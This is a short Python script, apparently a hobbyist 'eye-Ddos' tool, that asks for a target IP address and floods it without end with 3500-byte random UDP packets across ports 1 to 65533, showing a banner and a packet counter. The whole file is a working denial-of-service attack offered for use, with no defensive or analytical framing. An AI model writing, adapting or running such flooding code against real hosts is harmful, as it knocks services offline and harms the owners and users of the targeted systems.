#Author SCRIPT K'
import socket
import os
import random
import time

B = '\033[1m'
R = '\033[31m'
N = '\033[0m'

white = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(3500)

os.system("clear")
print(" ")
print("___________                      ________       .___                 ")
print("\_   _____/__.__. ____           \______ \    __| _/____  ______     ")
print(" |    __)<   |  |/ __ \   ______  |    |  \  / __ |/  _ \/  ___/     ")
print(" |        \___  \  ___/  /_____/  |    `   \/ /_/ (  <_> )___ \      ")
print("/_______  / ____|\___  >         /_______  /\____ |\____/____  >     ")
print("        \/\/         \/                  \/      \/          \/      ")
print()
print("[" + B + "" + R + "#" + N + "] " + B + "" + R + "Author : load" + N + "   Eye Ddos From - " + B + "" + R + "Scriptkiddies" + N)
print()
print("\033[32m================================================================\033[0m")
print("\033[32mTool devoloped : eye-Ddos\033[0m")
print("\033[33mGithub 	       : https://github.com/loading07/eye-Ddos/\033[0m")
print("\033[32m================================================================\033[0m")
print()

ip = input("[+] Target's IP : ")
os.system("clear")
print("Attack starting...")
time.sleep(3)
while True:
    sent = 0
    for port in range(1, 65534):
        white.sendto(bytes, (ip, port))
        sent = sent + 1
        print("\033[1;91mSend \033[1;32m%s \033[1;91m Packets to \033[1;32m%s \033[1;91mThrough port \033[1;32m%s " % (sent, ip, port))

print("\033[1;92mAttack finished\033[0m")
